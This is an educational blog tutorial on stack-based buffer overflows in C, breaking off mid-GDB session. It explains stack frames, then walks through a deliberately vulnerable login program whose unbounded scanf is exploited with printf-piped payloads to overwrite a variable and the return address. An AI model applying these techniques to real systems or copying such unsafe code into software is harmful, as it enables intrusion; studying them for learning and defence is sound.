<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Stack Based Buffer Overflow Attacks | Sanketh's Blog</title><meta name=keywords content="vulnerabilities,buffer overflow,reverse engineering"><meta name=description content="Stack Based Buffer Overflow Attacks
A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).
Causes of Buffer Overflow Attacks in C
When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:"><meta name=author content="Sanketh"><link rel=canonical href=https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.deee627d8b8d9065acc54b2c9d901e601e142335047d242a93ba7bce86f41f19.css integrity="sha256-3u5ifYuNkGWsxUssnZAeYB4UIzUEfSQqk7p7zob0Hxk=" rel="preload stylesheet" as=style><link rel=icon href=https://sankethbk.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sankethbk.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sankethbk.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://sankethbk.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://sankethbk.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks/"><meta property="og:site_name" content="Sanketh's Blog"><meta property="og:title" content="Stack Based Buffer Overflow Attacks"><meta property="og:description" content="Stack Based Buffer Overflow Attacks A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).
Causes of Buffer Overflow Attacks in C When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-11-11T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-11T00:00:00+00:00"><meta property="article:tag" content="Vulnerabilities"><meta property="article:tag" content="Buffer Overflow"><meta property="article:tag" content="Reverse Engineering"><meta name=twitter:card content="summary"><meta name=twitter:title content="Stack Based Buffer Overflow Attacks"><meta name=twitter:description content="Stack Based Buffer Overflow Attacks
A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).
Causes of Buffer Overflow Attacks in C
When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://sankethbk.github.io/blog/posts/"},{"@type":"ListItem","position":2,"name":"Stack Based Buffer Overflow Attacks","item":"https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Stack Based Buffer Overflow Attacks","name":"Stack Based Buffer Overflow Attacks","description":"Stack Based Buffer Overflow Attacks A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).\nCauses of Buffer Overflow Attacks in C When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:\n","keywords":["vulnerabilities","buffer overflow","reverse engineering"],"articleBody":"Stack Based Buffer Overflow Attacks A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).\nCauses of Buffer Overflow Attacks in C When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:\n1. C allows writing beyond (and before) array bounds Arrays in C are just raw memory. The compiler does not perform runtime checks. If you write past buf[63], C simply writes into whatever memory comes next. char buf[64]; buf[100] = 'A'; // C happily writes here → overflow No warning, no crash, memory is overwritten silently.\n2. C strings rely on null termination C treats strings as a sequence of characters until it encounters a null termination character \\0\nProblems caused by this:\nFunctions like strcpy, gets, scanf(\"%s\") keep copying until they hit a null byte — not until the buffer ends. If input lacks a null terminator early enough, it will overflow. 3. Direct pointer arithmetic C allows writing to any address you compute.\n*(buf + 80) = 'X'; Since the memory layout of a program was quite predictable before the mitigations like ASLR arrived, attackers could easily calculate which address needs to be overwritten with what value.\nWhat is Stack? Stack is a segment of memory where the process stores function context: particularly function calls and its local variables.\nBefore Stack, programmers didn’t have a definite way of doing these things:\nWhere to store function arguments Where to store local variables Where to store the return address (so CPU knows where to go back) How to make function calls nested (A → B → C → D …) How to handle recursion (function calling itself multiple times) Some of the earlier assembly languages didn’t have the concept of stack, programmers had to simulate the stack on their own on a raw block of memory. Today all the mainstream CPU’s have support for stack at the hardware level.\nWhy a stack specifically (LIFO)? Function calls behave naturally like a Last-In-First-Out structure.\nExample:\nmain calls A A calls B B calls C Order of returning:\nC returns to B B returns to A A returns to main This is literally a LIFO pattern, a stack is the perfect structure.\nStructure of a Stack Frame A stack frame is a single entry in the call stack that contains all the local variables and metadata associated with a function invocation. In a nested function call chain, each function maintains its own distinct stack frame, creating a LIFO (Last-In-First-Out) structure.\nRegister Management in x86:\nThe EBP (Base Pointer) register marks the base of the currently active stack frame The ESP (Stack Pointer) register points to the top of the stack The Reality of Function Calls:\nWhile high-level languages like C use function call syntax, the underlying assembly implementation is fundamentally different. At the assembly level, there is no native concept of “functions”—each function call is simply a jump to a different memory location containing executable instructions.\nThis creates an important challenge: since function calls are just jumps, how do the caller and callee exchange information? How are parameters passed? Where should return values be placed?\nThe Application Binary Interface (ABI):\nThe solution is the ABI—a standardized calling convention that defines the contract between caller and callee. The ABI specifies:\nHow arguments are passed (registers vs. stack) Which registers are preserved across calls Where return values are stored How the stack frame is set up and torn down Without this agreement, function calls across separately compiled code would be impossible, as each piece of code would have different expectations about parameter passing and register usage.\nLet’s take an example\nint main() { A(5); } void A(int a) { B(3); } void B(int b) { int local_var1; char local_var2; } The stack for this code when C is called will look like this:\nHigher Memory Addresses (0xFFFFFFFF) ↑ | | STACK GROWTH DIRECTION | ↓↓↓ | +------------------+ | Arguments | ← Arguments for function A (if any) | for A | +------------------+ | Return Addr | ← Where to return after A finishes (e.g., main) | to main | +------------------+ | Saved EBP | ← main's base pointer | (main's frame) | +------------------+ ← EBP when A is executing (A's frame base) | A's Local | | Variables | | - local_var1 | | - local_var2 | +------------------+ | Arguments | ← Arguments pushed for B (right to left in C) | for B | e.g., arg2, arg1 +------------------+ | Return Addr | ← Where to return in A after B finishes | to A | +------------------+ | Saved EBP | ← A's base pointer saved | (A's frame) | +------------------+ ← EBP (Current frame base - B is executing) | B's Local | | Variables | | - local_var1 | | - local_var2 | +------------------+ ← ESP (Stack pointer - top of stack) | | | (Unused | | Stack | | Space) | | | ↓ Lower Memory Addresses (0x00000000) What Happens During a Function Call Now let’s look at thx86 assembly code for what happens when a function is called\n1. Caller’s Responsibilities (Before the Jump): First, the caller must save the return address—the location where execution should resume after the function completes. Let’s see what happens when function A calls function B.\npush arguments_to_function_B (pushed in reverse order) push next_instruction_address_of_function_A (the value in EIP register) jmp address_of_function_B Sometimes the Caller can also decide to save all the values of general purpose registers to avoid losing its values from being overwritten by the caller.\n; Function A calling Function B with register preservation function_A: ; ... A's code using registers ... mov eax, 100 ; EAX has important data mov ebx, 200 ; EBX has important data mov ecx, 300 ; ECX has important data ; Prepare to call B pusha ; Push all general-purpose registers onto stack ; Order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI push arguments_to_function_B ; (pushed in reverse order) push next_instruction_address_of_function_A ; (the value in EIP register) jmp address_of_function_B popa ; Restore all registers to their original values ; Now EAX=100, EBX=200, ECX=300 again ; Continue with A's logic, registers are preserved ; ... Most of the times callee’s ABI clearly defines what register values are preserved and what can be overwritten, we can only save those registers instead.\n2. Callee’s Responsibilities (Function Prologue): Once inside the function B, we need to set up a new stack frame:\naddress_of_function_B: push ebp ; Save the old base pointer (of function A) mov ebp, esp ; Set EBP to current stack top (new frame base) sub esp, N ; Allocate space for local variables (N bytes) This sequence accomplishes three things:\nPreserves the caller’s frame pointer (old EBP) so we can restore it late Establishes a new base pointer for the current function Allocates stack space for local variables by moving ESP downward 3. Function Execution: The function body executes, with local variables accessible via offsets from EBP:\n[ebp-4] accesses the first local variable [ebp-8] accesses the second, and so on Function parameters (if pushed by caller) are at [ebp+8], [ebp+12], etc. 4. Callee’s Responsibilities (Function Epilogue): Before returning, we must tear down the stack frame and restore state:\nmov esp, ebp ; Deallocate local variables (restore ESP) pop ebp ; Restore the old base pointer ret_address = pop() ; Get return address from stack jmp ret_address ; Jump back to caller This will:\nCollapses the function B’s stack frame by resetting ESP to EBP Restores the caller’s base pointer Retrieves the return address from the stack (saved by function A) Jumps back to continue execution after the original call site Simplified Function Call with CALL/RET/LEAVE The x86 instruction set provides three specialized instructions that automate this process:\nThe CALL Instruction: call function_address This single instruction replaces:\npush next_instruction_address jmp function_address It automatically pushes the return address (address of the instruction following call) onto the stack and jumps to the target function.\nThe LEAVE Instruction: leave This single instruction replaces:\nmov esp, ebp pop ebp It efficiently collapses the stack frame and restores the old base pointer in one operation.\nThe RET Instruction: ret This single instruction replaces:\npop eip ; Pop return address into instruction pointer jmp eip ; Jump to return address Complete Example with Simplified Instructions: ; Caller side: push argument2 push argument1 call my_function ; Pushes return address and jumps add esp, 8 ; Clean up arguments (caller cleanup) ; Callee side: my_function: push ebp ; Save old frame pointer mov ebp, esp ; Set up new frame sub esp, 16 ; Allocate local variables ; ... function body ... leave ; Equivalent to: mov esp, ebp; pop ebp ret ; Pop return address and jump to it Buffer OverFlow Attacks 1. Overwriting a Variable On Stack Consider this C program\n#include #include void grantAccess() { printf(\"Access Granted\\n\"); } void checkPassword(char* password, int *isAuthenticated) { if (strcmp(password, \"admin123\") == 0) { *isAuthenticated = 1; } } void AuthenticateUser() { int isAuthenticated = 0; char password[8]; printf(\"Enter password: \"); scanf(\"%s\", password); checkPassword(password, \u0026isAuthenticated); if (isAuthenticated == 1) { grantAccess(); } else { printf(\"Authentication Failed\\n\"); } } int main() { AuthenticateUser(); } This is the normal working of the program\n$ gcc main.c $ ./a.out Enter password: password Authentication Failed $ ./a.out Enter password: admin123 Access Granted What if we don’t know the correct password? Can we still gain access?\nThe vulnerability lies in scanf(\"%s\", password); which performs no bounds checking. This allows us to write more than 8 bytes into the password buffer, potentially overwriting adjacent stack variables—specifically, the isAuthenticated variable.\nStack layout when AuthenticateUser() is executing:\nHigher Addresses +-------------------------+ | Saved return address | ← Return address to main() +-------------------------+ | Saved RBP | ← Previous stack frame base +-------------------------+ ← RBP (current frame base) | isAuthenticated (4 bytes) | ← [RBP-4] +-------------------------+ | padding (if any) | +-------------------------+ | password[8] | ← [RBP-12] (buffer starts here) +-------------------------+ ← RSP (stack pointer) Lower Addresses Now let’s compile another version of the code known as vuln\n$ gcc -fno-stack-protector -O0 -o vuln main.c Why -fno-stack-protector?\nThe -fno-stack-protector flag disables GCC’s Stack Smashing Protector (SSP), also known as Stack Guard or ProPolice.\nThe Stack Guard’s main feature is stack canary - although the existence of stsck canary doesn’t stop this attack, we still need to disable it because Stack Guard also reorders the variables in stack such that isAuthenticated appears after password, so we would never be able to rewrite the password.\n-O0 will disable all compiler optimizations, so we can see all the assembly code.\nLet’s start by printing the disassembly of the key functions\n(gdb) disass AuthenticateUser Dump of assembler code for function AuthenticateUser: 0x00000000000011fe \u003c+0\u003e:\tendbr64 0x0000000000001202 \u003c+4\u003e:\tpush rbp 0x0000000000001203 \u003c+5\u003e:\tmov rbp,rsp 0x0000000000001206 \u003c+8\u003e:\tsub rsp,0x10 0x000000000000120a \u003c+12\u003e:\tmov DWORD PTR [rbp-0x4],0x0 0x0000000000001211 \u003c+19\u003e:\tlea rax,[rip+0xe04] # 0x201c 0x0000000000001218 \u003c+26\u003e:\tmov rdi,rax 0x000000000000121b \u003c+29\u003e:\tmov eax,0x0 0x0000000000001220 \u003c+34\u003e:\tcall 0x1090 0x0000000000001225 \u003c+39\u003e:\tlea rax,[rbp-0xc] 0x0000000000001229 \u003c+43\u003e:\tmov rsi,rax 0x000000000000122c \u003c+46\u003e:\tlea rax,[rip+0xdfa] # 0x202d 0x0000000000001233 \u003c+53\u003e:\tmov rdi,rax 0x0000000000001236 \u003c+56\u003e:\tmov eax,0x0 0x000000000000123b \u003c+61\u003e:\tcall 0x10b0 \u003c__isoc99_scanf@plt\u003e 0x0000000000001240 \u003c+66\u003e:\tlea rdx,[rbp-0x4] 0x0000000000001244 \u003c+70\u003e:\tlea rax,[rbp-0xc] 0x0000000000001248 \u003c+74\u003e:\tmov rsi,rdx 0x000000000000124b \u003c+77\u003e:\tmov rdi,rax 0x000000000000124e \u003c+80\u003e:\tcall 0x11c3 0x0000000000001253 \u003c+85\u003e:\tmov eax,DWORD PTR [rbp-0x4] 0x0000000000001256 \u003c+88\u003e:\tcmp eax,0x1 0x0000000000001259 \u003c+91\u003e:\tjne 0x1267 0x000000000000125b \u003c+93\u003e:\tmov eax,0x0 0x0000000000001260 \u003c+98\u003e:\tcall 0x11a9 0x0000000000001265 \u003c+103\u003e:\tjmp 0x1276 0x0000000000001267 \u003c+105\u003e:\tlea rax,[rip+0xdc2] # 0x2030 0x000000000000126e \u003c+112\u003e:\tmov rdi,rax 0x0000000000001271 \u003c+115\u003e:\tcall 0x1080 0x0000000000001276 \u003c+120\u003e:\tnop 0x0000000000001277 \u003c+121\u003e:\tleave 0x0000000000001278 \u003c+122\u003e:\tret End of assembler dump. (gdb) disass checkPassword Dump of assembler code for function checkPassword: 0x00000000000011c3 \u003c+0\u003e:\tendbr64 0x00000000000011c7 \u003c+4\u003e:\tpush rbp 0x00000000000011c8 \u003c+5\u003e:\tmov rbp,rsp 0x00000000000011cb \u003c+8\u003e:\tsub rsp,0x10 0x00000000000011cf \u003c+12\u003e:\tmov QWORD PTR [rbp-0x8],rdi 0x00000000000011d3 \u003c+16\u003e:\tmov QWORD PTR [rbp-0x10],rsi 0x00000000000011d7 \u003c+20\u003e:\tmov rax,QWORD PTR [rbp-0x8] 0x00000000000011db \u003c+24\u003e:\tlea rdx,[rip+0xe31] # 0x2013 0x00000000000011e2 \u003c+31\u003e:\tmov rsi,rdx 0x00000000000011e5 \u003c+34\u003e:\tmov rdi,rax 0x00000000000011e8 \u003c+37\u003e:\tcall 0x10a0 0x00000000000011ed \u003c+42\u003e:\ttest eax,eax 0x00000000000011ef \u003c+44\u003e:\tjne 0x11fb 0x00000000000011f1 \u003c+46\u003e:\tmov rax,QWORD PTR [rbp-0x10] 0x00000000000011f5 \u003c+50\u003e:\tmov DWORD PTR [rax],0x1 0x00000000000011fb \u003c+56\u003e:\tnop 0x00000000000011fc \u003c+57\u003e:\tleave 0x00000000000011fd \u003c+58\u003e:\tret End of assembler dump. By looking at the assembly of AuthenticateUser we can pinpoint where isAuthenticated and password are located on stack.\nisAuthenticated at [rbp-0x4] 0x120a \u003c+12\u003e: mov DWORD PTR [rbp-0x4],0x0 this is writing 0 to the address [rbp-0x4], which is equivalent to the C code\nint isAuthenticated = 0; // Initialize to 0 password is at [rbp-0xc] We can just figure it out by looking at the arguments passed to checkPassword\n0x1240 \u003c+66\u003e: lea rdx,[rbp-0x4] ; Load address of [rbp-0x4] 0x1244 \u003c+70\u003e: lea rax,[rbp-0xc] ; Load address of [rbp-0xc] 0x1248 \u003c+74\u003e: mov rsi,rdx ; 2nd arg: \u0026isAuthenticated 0x124b \u003c+77\u003e: mov rdi,rax ; 1st arg: password 0x124e \u003c+80\u003e: call 0x11c3 We know rdi contains first password and rsi contains second, from C code we can see first parameter is password and second parameter is isAuthenticated.\nNow let’s place a breakpoint right before this code\nif (isAuthenticated == 1) { We can spot the corresponding cmp assembly operation here\n0x000000000000124e \u003c+80\u003e:\tcall 0x11c3 0x0000000000001253 \u003c+85\u003e:\tmov eax,DWORD PTR [rbp-0x4] 0x0000000000001256 \u003c+88\u003e:\tcmp eax,0x1 0x0000000000001259 \u003c+91\u003e:\tjne 0x1267 0x000000000000125b \u003c+93\u003e:\tmov eax,0x0 0x0000000000001260 \u003c+98\u003e:\tcall 0x11a9 0x0000000000001265 \u003c+103\u003e:\tjmp 0x1276 Note that b *0x0000000000001256 won’t work because the addresses we are seeing are the offsets in ELF. But since our binary is a PIE executable there will be a constant offset added, we can figure out the actual address using that offset or we can simply place it like this\n(gdb) break *AuthenticateUser+88 Breakpoint 4 at 0x555555555256 GDB allows this since the relative offsets will same and it is aware of the symbols.\nNow let’s enter the password\n(gdb) c Continuing. Enter password: AAAAAAAA1 Breakpoint 4, 0x0000555555555256 in AuthenticateUser () AAAAAAAA1 is 9 bytes, just 1 byte more than password. Let’s inspect the memory to confirm if the overflow happened.\n(gdb) x/12xb $rbp - 0xc 0x7fffffffddf4:\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41 0x7fffffffddfc:\t0x31\t0x00\t0x00\t0x00 (gdb) x/1dw $rbp - 0x4 0x7fffffffddfc:\t49 Recall that $rbp - 0xc is the address of password and $rbp - 0x4 is the address of isAuthenticated.\nIn first command we are printing 12 bytes from 0x7fffffffddf4 we can see 9th byte is 0x31 which is the ascii value of 1 we entered at the end.\nBut since the value stored is not 0x01 we can see the value of isAuthenticated is not 49 which will still fail the check.\n(gdb) c Continuing. Authentication Failed [Inferior 1 (process 8454) exited normally] Now we know that overflow actually works, we can actually try to voerwrite 0x01 into the address of isAuthenticated. This is the scenario we are hoping for\n0x7fffffffddf4:\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41\t0x41 0x7fffffffddfc:\t0x01\t0x00\t0x00\t0x00 Note that the bytes 0x01\t0x00\t0x00\t0x00 appear reversed compared to the actual notation of 1 in 4-byte (word) format because this is little-endian representation.\nThe problem is the character whose ascii value is 0x01 is actually a non-printable character which means we can’t type it into the terminal.\nBut we can pass raw byte stream using utilities like printf and pipe its output to our program\n$ printf 'AAAAAAAA\\x01' | ./vuln Enter password: Access Granted This proves that the overwrite worked in an expected way!\n2. Overwriting the Return Address on the Stack In the earlier example, we were able to overwrite isAuthenticated because the buffer password was placed before it on the stack. When you write past the end of password, the overflow naturally overwrites the next variable in memory.\nFor the program we saw earlier, the key to overwriting isAuthenticated variable was the fact that its located after the password variable on the stack. If those two variables are reordered then its not possile to overwrite the value of password.\nvoid AuthenticateUser() { char password[8]; int isAuthenticated = 0; Even if the password is placed afterwards, GCC’s stack guard moves it such that password appears before the isAuthenticated variable, that’s why we had to disable the stack guard using the -fno-stack-protector option.\nBecause of this, we disabled GCC’s stack guard using:\n-fno-stack-protector\nWhen stack protection is off, we can reliably predict the layout and avoid the compiler reordering the variables.\nNow we intentionally reorder the variables so that the integer comes first in source code, but ends up higher on the stack — meaning overflowing password will no longer overwrite isAuthenticated:\n#include #include void grantAccess() { printf(\"Access Granted\\n\"); } void checkPassword(char* password, int *isAuthenticated) { if (strcmp(password, \"admin123\") == 0) { *isAuthenticated = 1; } } void AuthenticateUser() { char password[8]; int isAuthenticated = 0; printf(\"Enter password: \"); scanf(\"%s\", password); checkPassword(password, \u0026isAuthenticated); if (isAuthenticated == 1) { grantAccess(); } else { printf(\"Authentication Failed\\n\"); } } int main() { AuthenticateUser(); } Resulting Stack Layout\nWith stack protection disabled, the stack now looks like this:\nHigher Addresses +-----------------------------+ | Saved return address | +-----------------------------+ | Saved RBP | +-----------------------------+ ← RBP | password[8] | ← [RBP - 8 - padding] +-----------------------------+ | padding (alignment) | +-----------------------------+ | isAuthenticated (4 bytes) | ← [RBP - 12] +-----------------------------+ ← RSP Lower Addresses Now our goal is to overwrite the return address in AuthenticateUser to the address of grantAccess function. This will allow us to get the access regardless of the value of isAuthenticated variable.\nSince we need to replace the actual return address with grantAccess’s address, we need to pass it in the input to the program with appropriate byte calculations.\nTo calculate the address of a function at runtime we need to learn about PIE and ASLR.\nNon Position Independent Executable The best way to understand Position Independent Code and Position Independent Executable is to compare its differences with non-PIE binary.\nLet’s compile a binary with -fno-stack-protector and -fno-pie flags\n$ gcc -fno-pie -no-pie -fno-stack-protector -O0 -o vuln_no_pie main.c -fno-pie: tells compiler to build non PIE -no-pie: tells linker that the binary is non PIE\nWe know that ELF file decides a virtual address for each of the sections, we can check it from the section header table.\n$ readelf -S vuln_no_pie | grep -E '.text|.data|.rodata' [15] .text PROGBITS 00000000004010b0 000010b0 [17] .rodata PROGBITS 0000000000402000 00002000 [25] .data PROGBITS 0000000000404020 00003020 We can see as per the ELF file the .text segment starts at virtual address 0x00000000004010b0 .\nLet’s disassemble the binary and confirm it\n$ objdump -d -M intel,mnemonic,no-att -j .text vuln_no_pie vuln_no_pie: file format elf64-x86-64 Disassembly of section .text: 00000000004010b0 \u003c_start\u003e: 4010b0:\tf3 0f 1e fa endbr64 4010b4:\t31 ed xor ebp,ebp 4010b6:\t49 89 d1 mov r9,rdx 4010b9:\t5e pop rsi 4010ba:\t48 89 e2 mov rdx,rsp 4010bd:\t48 83 e4 f0 and rsp,0xfffffffffffffff0 4010c1:\t50 push rax 4010c2:\t54 push rsp 4010c3:\t45 31 c0 xor r8d,r8d 4010c6:\t31 c9 xor ecx,ecx 4010c8:\t48 c7 c7 4d 12 40 00 mov rdi,0x40124d 4010cf:\tff 15 03 2f 00 00 call QWORD PTR [rip+0x2f03] # 403fd8 \u003c__libc_start_main@GLIBC_2.34\u003e 4010d5:\tf4 hlt 4010d6:\t66 2e 0f 1f 84 00 00 cs nop WORD PTR [rax+rax*1+0x0] 4010dd:\t00 00 00 0000000000401196 : 401196:\tf3 0f 1e fa endbr64 40119a:\t55 push rbp 40119b:\t48 89 e5 mov rbp,rsp 40119e:\tbf 04 20 40 00 mov edi,0x402004 4011a3:\te8 c8 fe ff ff call 401070 4011a8:\t90 nop 4011a9:\t5d pop rbp 4011aa:\tc3 ret 00000000004011ab : 4011ab:\tf3 0f 1e fa endbr64 4011af:\t55 push rbp 4011b0:\t48 89 e5 mov rbp,rsp 4011b3:\t48 83 ec 10 sub rsp,0x10 4011b7:\t48 89 7d f8 mov QWORD PTR [rbp-0x8],rdi 4011bb:\t48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi 4011bf:\t48 8b 45 f8 mov rax,QWORD PTR [rbp-0x8] 4011c3:\tbe 13 20 40 00 mov esi,0x402013 4011c8:\t48 89 c7 mov rdi,rax 4011cb:\te8 c0 fe ff ff call 401090 4011d0:\t85 c0 test eax,eax 4011d2:\t75 0a jne 4011de 4011d4:\t48 8b 45 f0 mov rax,QWORD PTR [rbp-0x10] 4011d8:\tc7 00 01 00 00 00 mov DWORD PTR [rax],0x1 4011de:\t90 nop 4011df:\tc9 leave 4011e0:\tc3 ret 00000000004011e1 : 4011e1:\tf3 0f 1e fa endbr64 4011e5:\t55 push rbp 4011e6:\t48 89 e5 mov rbp,rsp 4011e9:\t48 83 ec 10 sub rsp,0x10 4011ed:\tc7 45 f4 00 00 00 00 mov DWORD PTR [rbp-0xc],0x0 4011f4:\tbf 1c 20 40 00 mov edi,0x40201c 4011f9:\tb8 00 00 00 00 mov eax,0x0 4011fe:\te8 7d fe ff ff call 401080 401203:\t48 8d 45 f8 lea rax,[rbp-0x8] 401207:\t48 89 c6 mov rsi,rax 40120a:\tbf 2d 20 40 00 mov edi,0x40202d 40120f:\tb8 00 00 00 00 mov eax,0x0 401214:\te8 87 fe ff ff call 4010a0 \u003c__isoc99_scanf@plt\u003e 401219:\t48 8d 55 f4 lea rdx,[rbp-0xc] 40121d:\t48 8d 45 f8 lea rax,[rbp-0x8] 401221:\t48 89 d6 mov rsi,rdx 401224:\t48 89 c7 mov rdi,rax 401227:\te8 7f ff ff ff call 4011ab 40122c:\t8b 45 f4 mov eax,DWORD PTR [rbp-0xc] 40122f:\t83 f8 01 cmp eax,0x1 401232:\t75 0c jne 401240 401234:\tb8 00 00 00 00 mov eax,0x0 401239:\te8 58 ff ff ff call 401196 40123e:\teb 0a jmp 40124a 401240:\tbf 30 20 40 00 mov edi,0x402030 401245:\te8 26 fe ff ff call 401070 40124a:\t90 nop 40124b:\tc9 leave 40124c:\tc3 ret 000000000040124d : 40124d:\tf3 0f 1e fa endbr64 401251:\t55 push rbp 401252:\t48 89 e5 mov rbp,rsp 401255:\tb8 00 00 00 00 mov eax,0x0 40125a:\te8 82 ff ff ff call 4011e1 40125f:\tb8 00 00 00 00 mov eax,0x0 401264:\t5d pop rbp 401265:\tc3 ret This confirms that the .text section indeed starts at 0x00000000004010b0 and the disassembly shows that the address of grantAccess function is 0x0000000000401196.\nSo if we can overwrite the return address in AuthenticateUser function’s stack frame to this address we should be able to achieve the goal.\nWe can see isAuthenticated is at [rbp - 0x0C] and password is at [rbp - 0x08] as expected. Since stack grows from higher address to lower addresses and we are on little-endian CPU, password will start at [rbp - 0x08] and end at [rbp - 0x01].\n+-------------------------------+ rbp + 8 ---\u003e | Return address | \u003c-- overwriting this hijacks control +-------------------------------+ rbp ---\u003e | Saved RBP | +-------------------------------+ rbp-0x01 ---\u003e | password[7] | | .... | rbp-0x08 ---\u003e | password[0] | +-------------------------------+ rbp-0x0C ---\u003e | isAuthenticated | +-------------------------------+ rbp-0x10 ---\u003e | padding | +-------------------------------+ So the payload we need to build should be like this\noffset 0x00..0x07 : 8 bytes -\u003e filler for password offset 0x08..0x0F : 8 bytes -\u003e overwrite saved RBP (can be garbage) offset 0x10..0x17 : 8 bytes -\u003e overwrite saved RIP with 0x401196 (little-endian) $ printf 'AAAAAAAAAAAAAAAA\\x96\\x11\\x40\\x00\\x00\\x00\\x00\\x00' | ./vuln_no_pie Enter password: Authentication Failed Access Granted Segmentation fault (core dumped) Here AAAAAAAAAAAAAAAA is 16 bytes, which will overwrite saved RBP, \\x96\\x11\\x40\\x00\\x00\\x00\\x00\\x00 is the address of grantAccess function in little endian format which will overwrite the return address.\nWe can see even though the password check failed Authentication Failed, we’re able to get the access Access Granted.\nAfter this we see Segmentation fault (core dumped).\nWe can check kernel logs to see what exactly happened during segmentation fault.\n$ sudo dmesg | tail -20 [13886.938338] vuln_no_pie[4028]: segfault at 7ffcd8fcd100 ip 00007ffcd8fcd100 sp 00007ffcd8fcd0a8 error 15 likely on CPU 6 (core 2, socket 0) [13886.938371] Code: 00 00 d6 1e d4 6e 73 78 01 4e 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3e 40 00 00 00 00 00 00 10 91 90 5a 7e 00 00 1e 34 6d 73 78 01 4e d6 1e 56 8f 4f e9 4d 4d 00 00 00 00 fc 7f Let’s load the binary into GDB and see when exactly the Segmentation fault occured.\n(gdb) disass AuthenticateUser Dump of assembler code for function AuthenticateUser: 0x00000000004011e1 \u003c+0\u003e:\tendbr64 0x00000000004011e5 \u003c+4\u003e:\tpush rbp 0x00000000004011e6 \u003c+5\u003e:\tmov rbp,rsp 0x00000000004011e9 \u003c+8\u003e:\tsub rsp,0x10 0x00000000004011ed \u003c+12\u003e:\tmov DWORD PTR [rbp-0xc],0x0 0x00000000004011f4 \u003c+19\u003e:\tmov edi,0x40201c 0x00000000004011f9 \u003c+24\u003e:\tmov eax,0x0 0x00000000004011fe \u003c+29\u003e:\tcall 0x401080 0x0000000000401203 \u003c+34\u003e:\tlea rax,[rbp-0x8] 0x0000000000401207 \u003c+38\u003e:\tmov rsi,rax 0x000000000040120a \u003c+41\u003e:\tmov edi,0x40202d 0x000000000040120f \u003c+46\u003e:\tmov eax,0x0 0x0000000000401214 \u003c+51\u003e:\tcall 0x4010a0 \u003c__isoc99_scanf@plt\u003e 0x0000000000401219 \u003c+56\u003e:\tlea rdx,[rbp-0xc] 0x000000000040121d \u003c+60\u003e:\tlea rax,[rbp-0x8] 0x0000000000401221 \u003c+64\u003e:\tmov rsi,rdx 0x0000000000401224 \u003c+67\u003e:\tmov rdi,rax 0x0000000000401227 \u003c+70\u003e:\tcall 0x4011ab 0x000000000040122c \u003c+75\u003e:\tmov eax,DWORD PTR [rbp-0xc] 0x000000000040122f \u003c+78\u003e:\tcmp eax,0x1 0x0000000000401232 \u003c+81\u003e:\tjne 0x401240 0x0000000000401234 \u003c+83\u003e:\tmov eax,0x0 0x0000000000401239 \u003c+88\u003e:\tcall 0x401196 0x000000000040123e \u003c+93\u003e:\tjmp 0x40124a 0x0000000000401240 \u003c+95\u003e:\tmov edi,0x402030 0x0000000000401245 \u003c+100\u003e:\tcall 0x401070 0x000000000040124a \u003c+105\u003e:\tnop 0x000000000040124b \u003c+106\u003e:\tleave 0x000000000040124c \u003c+107\u003e:\tret (gdb) b *0x0000000000401227 Breakpoint 1 at 0x401227 